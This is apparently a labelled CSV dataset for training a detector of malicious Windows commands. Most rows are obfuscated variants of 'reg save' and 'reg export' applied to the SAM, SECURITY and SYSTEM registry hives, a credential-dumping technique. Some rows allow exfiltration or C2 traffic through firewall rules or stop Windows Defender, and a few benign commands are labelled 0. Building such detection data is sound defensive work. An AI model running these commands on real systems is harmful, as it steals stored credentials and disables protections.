text,label
"powershell -nop -c ""reg export hklm\security c:\temp\kb3fqzey.dat""",1
reg save hklm\sam c:\windows\temp\rxmf9g4s.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\sle5nqzx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\13pxvk2o.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\k52tnmm1.save""",1
reg save hklm\sam c:\windows\temp\d83d2m91.save,1
reg save hklm\system c:\windows\temp\upxbdzv8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\j5k02h3t.dat""",1
reg save hklm\sam c:\windows\temp\uhf3bcql.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\qj5iyrk5.save""",1
reg export hklm\sam c:\windows\temp\4w8qh45o.save,1
reg  export  hklm\sam  c:\windows\temp\wxya7n7m.save,1
reg export hklm\security c:\windows\temp\hncq9gzt.save,1
reg save hklm\security c:\windows\temp\kleo9w20.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\m1vvwwp2.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\o4olqga1.dat""",1
reg   export   hklm\system   c:\windows\temp\lctu84zv.save,1
reg export hklm\sam c:\windows\temp\dzg5twvb.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\waqvmsw6.dat""",1
reg save hklm\sam c:\windows\temp\e0eq786k.save,1
reg export hklm\security c:\windows\temp\p3g6uam5.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yh4h3aan.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\oeom73j0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rjdha1uu.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\zpqb94ni.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\fqits502.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\yddjq6ji.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0ljjd7ia.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\uqu9pow3.dat""",1
reg export hklm\sam c:\windows\temp\gfmmpkzk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ifyzijre.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rakko48e.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\qh0lwta6.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\esz1t6dw.dat""",1
reg export hklm\system c:\windows\temp\eo6nqbel.save,1
reg export hklm\system c:\windows\temp\ofi5wrvf.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\5m2wqugg.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xlhsvozr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2pjvxk37.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\z6qeshq2.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9izas5qi.dat""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\w5t1uz7e.save""",1
reg save hklm\system c:\windows\temp\46bsean9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\xlnimatn.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mu65url2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1ahd6mtr.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zwqnzdc5.dat""",1
reg export hklm\sam c:\windows\temp\8gooeqhp.save,1
reg save hklm\sam c:\windows\temp\5x7663em.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\b3aoa1z1.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\g76e0fb8.dat""",1
reg save hklm\system c:\windows\temp\m3mubhb1.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oeglx7b1.dat""",1
reg export hklm\sam c:\windows\temp\7rl94xw0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\p19wu39c.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kx6j0ac1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\b2vqm6gs.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\4sdeo5y3.dat""",1
reg export hklm\sam c:\windows\temp\u16vec0f.save,1
reg save hklm\sam c:\windows\temp\fjvokabg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ytl4kwsg.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\zsif9dn4.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s1gbv0p7.dat""",1
reg export hklm\system c:\windows\temp\93k2c4xw.save,1
reg save hklm\sam c:\windows\temp\s6kfc823.save,1
reg export hklm\system c:\windows\temp\2bg7c3le.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\iwwvuk07.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\6171naab.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\qc4stgfg.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\tjc3qrb6.save""",1
reg  save  hklm\security  c:\windows\temp\psfaj5ll.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\y3p8ra8t.save""",1
reg export hklm\security c:\windows\temp\zzxm4bqn.save,1
reg export hklm\system c:\windows\temp\e0v42kda.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qpnuxggc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0bdxujn1.dat""",1
reg export hklm\system c:\windows\temp\ss3ipir4.save,1
reg save hklm\sam c:\windows\temp\1dtmd5fl.save,1
reg save hklm\sam c:\windows\temp\f7yo2hsh.save,1
reg save hklm\security c:\windows\temp\635mdcbj.save,1
reg export hklm\security c:\windows\temp\4ghre0qy.save,1
reg save hklm\security c:\windows\temp\5zzs5h4h.save,1
reg export hklm\security c:\windows\temp\wpifkupe.save,1
reg export hklm\sam c:\windows\temp\h0qplvd5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8jepia2v.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\m7c96l8j.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\i012a1rq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\imgaxtcs.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\w3d6gtts.dat""",1
reg export hklm\system c:\windows\temp\uaoalu7i.save,1
reg save hklm\system c:\windows\temp\phwtggs1.save,1
reg save hklm\sam c:\windows\temp\gzhenc9n.save,1
reg save hklm\sam c:\windows\temp\1ynqh58o.save,1
reg export hklm\system c:\windows\temp\hyun9zh2.save,1
reg save hklm\sam c:\windows\temp\a3ec12o2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\z683kkjt.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\axgom6tm.dat""",1
reg save hklm\system c:\windows\temp\bvz2abp9.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hev3c5gc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qd2rg1qx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\l6ahhbeb.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\lyq8om21.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\48dixae3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\njmeii83.dat""",1
reg export hklm\system c:\windows\temp\x3q034fj.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\h5u1nr8l.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\y8w1nrb7.dat""",1
reg save hklm\system c:\windows\temp\mxvxpzrz.save,1
reg export hklm\sam c:\windows\temp\8qszq97s.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\qtr3zy7r.dat""",1
reg save hklm\sam c:\windows\temp\im34y02u.save,1
reg save hklm\security c:\windows\temp\7n9ptyhm.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jsgepdfz.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\wkf6f0w3.dat""",1
reg   save   hklm\sam   c:\windows\temp\ieghh1g9.save,1
reg  save  hklm\system  c:\windows\temp\77w5l6os.save,1
reg export hklm\security c:\windows\temp\8g4utwfo.save,1
reg export hklm\sam c:\windows\temp\dniab48w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bgoj5yl1.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\hfg56wn9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5ze5yzc9.dat""",1
reg save hklm\system c:\windows\temp\v2nuf04u.save,1
reg export hklm\system c:\windows\temp\e2zlxlb4.save,1
reg save hklm\sam c:\windows\temp\gqqwe464.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\6n50g8rp.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ig3jx2ip.dat""",1
reg save hklm\sam c:\windows\temp\kvuja0z3.save,1
reg export hklm\security c:\windows\temp\plwemybm.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\muoqlh46.dat""""",1
reg export hklm\security c:\windows\temp\97ygirwr.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\isby3ey8.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\hob3px13.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ovlnt2h9.dat""",1
reg export hklm\security c:\windows\temp\pkr4a3xt.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\sy99u5zd.dat""",1
reg save hklm\system c:\windows\temp\hieh9g1s.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\43ehyb5r.dat""",1
reg  export  hklm\sam  c:\windows\temp\43fbzmdy.save,1
reg   export   hklm\sam   c:\windows\temp\suxc65zp.save,1
reg save hklm\sam c:\windows\temp\lsepslw0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ceutp4i4.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\x6yjfcrk.dat""",1
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
reg export hklm\system c:\windows\temp\sx5yt52j.save,1
reg save hklm\system c:\windows\temp\jm2ocm33.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ulnz2g1c.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\w8zugw8l.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hz9mas2y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\29g6c738.dat""",1
reg save hklm\security c:\windows\temp\cyc8ebj2.save,1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\s09hess0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sblcdkpj.dat""",1
reg save hklm\security c:\windows\temp\rvne4az7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\u369rf9h.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\nw4ze4a2.dat""",1
reg save hklm\system c:\windows\temp\mqf9ivlv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\2hmxixr0.dat""",1
reg export hklm\system c:\windows\temp\p2uygrp4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\83mybeyj.dat""",1
reg export hklm\security c:\windows\temp\0dd9wt6y.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\nhp3ei7x.dat""",1
reg save hklm\security c:\windows\temp\a2lf37m0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cfn0bud2.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\9i9jh7dx.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qdqsgr6c.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cdzqmiff.dat""",1
reg export hklm\sam c:\windows\temp\r2o36e6c.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0hxdhcqp.dat""",1
reg export hklm\sam c:\windows\temp\0x3pq24v.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\nlr1cgt9.dat""",1
reg export hklm\security c:\windows\temp\rbgu2vt0.save,1
reg export hklm\sam c:\windows\temp\ydbd8mvc.save,1
reg export hklm\sam c:\windows\temp\zszi4oy5.save,1
reg  save  hklm\system  c:\windows\temp\tfsg2dzo.save,1
reg export hklm\sam c:\windows\temp\tdgavhrq.save,1
reg save hklm\system c:\windows\temp\g2jk5pnv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\xivuthlq.dat""",1
reg save hklm\system c:\windows\temp\56tbv817.save,1
reg save hklm\sam c:\windows\temp\odmvopli.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\s1940611.dat""",1
reg save hklm\security c:\windows\temp\zacj742r.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\z6xr96em.dat""",1
reg export hklm\security c:\windows\temp\xmr0z8ez.save,1
reg save hklm\system c:\windows\temp\l5l19g9t.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\8mo9i82b.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\vnfef6n8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\r55mwtc6.dat""",1
reg export hklm\system c:\windows\temp\prrfvgen.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\z61d56vv.dat""",1
reg save hklm\security c:\windows\temp\conaxlp2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\c5bekche.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8ul0z5yd.dat""",1
reg export hklm\system c:\windows\temp\znapdarv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6q89ymt0.dat""",1
reg export hklm\system c:\windows\temp\tywl2wek.save,1
reg export hklm\system c:\windows\temp\orckgtlq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\bosqicab.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\royqduet.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nadjecwd.dat""",1
reg save hklm\system c:\windows\temp\xvpu6d4a.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\mwgizxja.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\gocylzm5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ln4iw1ou.dat""",1
reg save hklm\system c:\windows\temp\9hr46hzf.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\nk5hzhfn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jfgwb3j1.dat""",1
reg export hklm\security c:\windows\temp\a3svn1jq.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\eeb0y42j.dat""""",1
reg export hklm\sam c:\windows\temp\l1arednx.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\k8c85qqa.dat""""",1
reg save hklm\security c:\windows\temp\bpnw2wvp.save,1
reg export hklm\security c:\windows\temp\2qplqkio.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ycrvky63.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ex5uu63w.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\j0h6aglv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\aj8lczbr.dat""",1
reg export hklm\sam c:\windows\temp\zfhel1mq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\scbxan96.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\r0ttxkl0.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pbkhtc4r.dat""",1
reg export hklm\system c:\windows\temp\6lub5yfx.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0jdixx6w.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7l7ts6ou.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6p2d5gbx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\kbrmc57z.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\q19tgs98.dat""",1
reg save hklm\security c:\windows\temp\2utyuov0.save,1
reg save hklm\sam c:\windows\temp\fep99gir.save,1
reg export hklm\security c:\windows\temp\rxd2pfdn.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\wyng9y8j.dat""",1
reg save hklm\security c:\windows\temp\6ufowjta.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\r7tkn4g4.save""",1
reg export hklm\security c:\windows\temp\1tlakcmu.save,1
reg save hklm\security c:\windows\temp\u6gh854x.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\zsveek8n.dat""",1
reg save hklm\sam c:\windows\temp\rjdbrzu3.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\nh56zyaz.dat""""",1
reg save hklm\security c:\windows\temp\zpl238ca.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\9zumqewv.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nmko6jwe.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\gopwtrkz.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\1768dr56.dat""",1
reg save hklm\system c:\windows\temp\ugizfba7.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\ffaxonhz.dat""",1
reg save hklm\security c:\windows\temp\6z3y3lq5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wt2j9p0b.dat""",1
reg save hklm\sam c:\windows\temp\t3rr0kps.save,1
reg save hklm\security c:\windows\temp\sq0y26al.save,1
reg export hklm\system c:\windows\temp\2zxe8hwa.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\sevt9ra2.dat""",1
reg export hklm\system c:\windows\temp\ujf7pw1k.save,1
reg   save   hklm\system   c:\windows\temp\d10czvyg.save,1
reg export hklm\sam c:\windows\temp\tyaiwbzk.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\momna521.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ngxwi8st.dat""",1
reg save hklm\system c:\windows\temp\sjx1woqp.save,1
reg export hklm\sam c:\windows\temp\bq72glhw.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\rzyhqfse.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4uxzvr9q.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gcnsjxp6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r98vfniw.dat""",1
reg save hklm\system c:\windows\temp\l96mx2n8.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\1dl9yydh.dat""""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\m6d1othd.dat""",1
reg save hklm\sam c:\windows\temp\sjd0pp40.save,1
reg save hklm\sam c:\windows\temp\jjoxcwdx.save,1
reg save hklm\security c:\windows\temp\n62j9ip6.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\hf77wfxt.dat""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\9gslcnyw.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vmfs1jwj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5i82m6mc.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8coyclhh.dat""",1
reg save hklm\security c:\windows\temp\srrw2gl7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hswjxsaa.dat""",1
reg save hklm\sam c:\windows\temp\t4aqvg8e.save,1
reg save hklm\sam c:\windows\temp\vqeow6uu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\t3niyk83.dat""",1
reg export hklm\system c:\windows\temp\x8cyciis.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gtxira67.dat""",1
reg export hklm\sam c:\windows\temp\xtijcixp.save,1
reg save hklm\security c:\windows\temp\43a4lw7e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\euwf3hm8.dat""",1
reg export hklm\security c:\windows\temp\mplirqkr.save,1
reg save hklm\system c:\windows\temp\aoo68lwt.save,1
reg export hklm\system c:\windows\temp\bm50wnzz.save,1
reg export hklm\sam c:\windows\temp\u61ce87f.save,1
reg save hklm\security c:\windows\temp\u02yvhub.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\cgduszyu.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\88yn34r4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fou4u71c.dat""",1
select-string  -path  c:\logs\app.log  -pattern  'failed  logon',0
reg export hklm\system c:\windows\temp\nsqyvsa7.save,1
reg save hklm\sam c:\windows\temp\ppjcpg6s.save,1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\p0q23qkb.save,1
reg   export   hklm\sam   c:\windows\temp\hawjh3iw.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5da1nc1k.dat""""",1
reg export hklm\security c:\windows\temp\353zgqzp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6okxgnoq.dat""",1
reg export hklm\sam c:\windows\temp\37rsn22z.save,1
reg save hklm\security c:\windows\temp\5mv3ft3s.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\7a5sikv7.dat""",1
"powershell -nop -c ""wmic  product  get  name,  version""",0
reg export hklm\system c:\windows\temp\lp0u0a48.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\qjoj5sy0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6t3qjjlh.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\pj8sqbw9.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\9subxuw7.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\v43ma6eq.dat""",1
reg save hklm\system c:\windows\temp\9oslhavn.save,1
sc   stop   windefend,2
reg save hklm\sam c:\windows\temp\3ff87rse.save,1
reg save hklm\security c:\windows\temp\1n22qz3u.save,1
reg save hklm\security c:\windows\temp\6cobl7cv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ztiim4e9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sttgg3qo.dat""",1
reg export hklm\system c:\windows\temp\92dvif0o.save,1
reg export hklm\system c:\windows\temp\rxpjfnbc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\hzvubmqy.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\f4yzd6ue.dat""""",1
reg export hklm\sam c:\windows\temp\0thn3fia.save,1
reg export hklm\sam c:\windows\temp\9i0rwcu2.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\r8vfzjci.save""",1
reg export hklm\security c:\windows\temp\p01hbxf7.save,1
reg save hklm\system c:\windows\temp\ujwh00zw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\mmhdi7ke.dat""",1
reg save hklm\sam c:\windows\temp\xh6dawao.save,1
"powershell -nop -c ""get-help  adjusttokenprivileges  -full""",0
reg export hklm\sam c:\windows\temp\5qao21zc.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\is2t73hg.dat""",1
reg save hklm\sam c:\windows\temp\rutf49ra.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\k5hjmmmi.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qceti9en.dat""",1
reg export hklm\system c:\windows\temp\pmnsxrp9.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\vq3oxa6e.dat""""",1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg save hklm\system c:\windows\temp\kslp34j6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\65pyvt1t.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u1k4tzv5.dat""",1
reg save hklm\security c:\windows\temp\sct9lwpf.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ace1s5mi.dat""",1
"cmd.exe /c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
reg save hklm\system c:\windows\temp\36xkh66p.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\z31qu7j6.dat""",1
reg export hklm\system c:\windows\temp\1zz7ucoo.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\70bu32k9.dat""",1
reg export hklm\security c:\windows\temp\vma0qpmf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gsmbjc22.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hc0gs43p.dat""",1
reg export hklm\system c:\windows\temp\ktledd82.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\frqdhkc1.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jqoxto93.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\r22vjcpq.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\z8ek720p.dat""",1
reg export hklm\sam c:\windows\temp\c71ye5uk.save,1
reg export hklm\sam c:\windows\temp\cf06hov9.save,1
reg export hklm\sam c:\windows\temp\nmhassd8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9aipgb98.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\w3zflsci.dat""",1
reg save hklm\sam c:\windows\temp\yve50dgb.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\403s9djk.dat""",1
reg export hklm\sam c:\windows\temp\v4k94s14.save,1
reg export hklm\system c:\windows\temp\f4tu1bl1.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\leaicwk1.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\53dnazvs.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7uxcljvm.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fhy27ux9.dat""",1
reg export hklm\security c:\windows\temp\5jqqqtf6.save,1
reg export hklm\sam c:\windows\temp\d20z2e2f.save,1
reg save hklm\sam c:\windows\temp\g82pin2r.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\d1una7ud.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2zn4qm2l.dat""",1
reg export hklm\security c:\windows\temp\evaqr8yu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5ccs1oqi.dat""",1
reg export hklm\sam c:\windows\temp\d845gi2i.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\z874ij33.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\7lukpsu2.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\8frsalz0.save""",1
reg save hklm\system c:\windows\temp\mz06jzlo.save,1
reg save hklm\security c:\windows\temp\bw0pfemt.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\dmangivy.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3s8e8ivn.dat""",1
reg  export  hklm\sam  c:\windows\temp\dotra96g.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ltwkufk8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\a129i98q.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gl5x34py.dat""",1
reg save hklm\sam c:\windows\temp\donkdx0j.save,1
reg save hklm\system c:\windows\temp\5mfboqgx.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\oow8q94j.dat""",1
reg save hklm\security c:\windows\temp\kmzmdo56.save,1
